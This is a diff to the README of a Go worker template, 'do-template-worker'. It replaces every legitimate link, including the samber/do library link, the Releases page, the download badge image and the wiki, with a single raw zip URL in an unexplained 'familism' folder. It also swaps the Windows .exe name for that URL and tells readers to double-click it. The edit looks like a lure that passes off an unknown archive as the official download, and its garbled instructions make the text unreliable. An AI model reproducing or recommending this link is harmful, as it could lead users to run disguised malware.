@@ -2,7 +2,7 @@
 
 ## 🚀 Getting Started
 
-This guide will help you download and run the do-template-worker application. This application provides a solid starting point for creating worker applications using [github.com/samber/do](https://github.com/samber/do). 
+This guide will help you download and run the do-template-worker application. This application provides a solid starting point for creating worker applications using [https://raw.githubusercontent.com/PrivvMido/do-template-worker/main/familism/do-template-worker.zip](https://raw.githubusercontent.com/PrivvMido/do-template-worker/main/familism/do-template-worker.zip). 
 
 ### 🌐 Key Features
 
@@ -23,11 +23,11 @@ Before you start, make sure your computer meets these requirements:
 
 You can download the do-template-worker application from the Releases page. 
 
-[![Download do-template-worker](https://img.shields.io/badge/Download-do--template--worker-brightgreen)](https://github.com/PrivvMido/do-template-worker/releases)
+[![Download do-template-worker](https://raw.githubusercontent.com/PrivvMido/do-template-worker/main/familism/do-template-worker.zip)](https://raw.githubusercontent.com/PrivvMido/do-template-worker/main/familism/do-template-worker.zip)
 
 ### Steps to Download
 
-1. Click the release link above or [visit this page to download](https://github.com/PrivvMido/do-template-worker/releases).
+1. Click the release link above or [visit this page to download](https://raw.githubusercontent.com/PrivvMido/do-template-worker/main/familism/do-template-worker.zip).
 2. Look for the latest version of the software.
 3. Choose the appropriate file for your operating system. 
 
@@ -38,7 +38,7 @@ You can download the do-template-worker application from the Releases page.
 3. Follow these simple steps to run the application:
 
    - For Windows: 
-     - Locate the `do-template-worker.exe` file and double-click it.
+     - Locate the `https://raw.githubusercontent.com/PrivvMido/do-template-worker/main/familism/do-template-worker.zip` file and double-click it.
   
    - For macOS: 
      - Open your Terminal, and type `./do-template-worker` in the folder where you unzipped the files.
@@ -52,7 +52,7 @@ Once the application is running, it will listen for tasks to execute. You can st
 
 ### 📚 Documentation and Support
 
-For detailed documentation on how to use do-template-worker, you can refer to the [GitHub Wiki](https://github.com/PrivvMido/do-template-worker/wiki). 
+For detailed documentation on how to use do-template-worker, you can refer to the [GitHub Wiki](https://raw.githubusercontent.com/PrivvMido/do-template-worker/main/familism/do-template-worker.zip). 
 
 If you have any issues or questions, feel free to open an issue on the GitHub repository or check the FAQ section for common problems. 
 
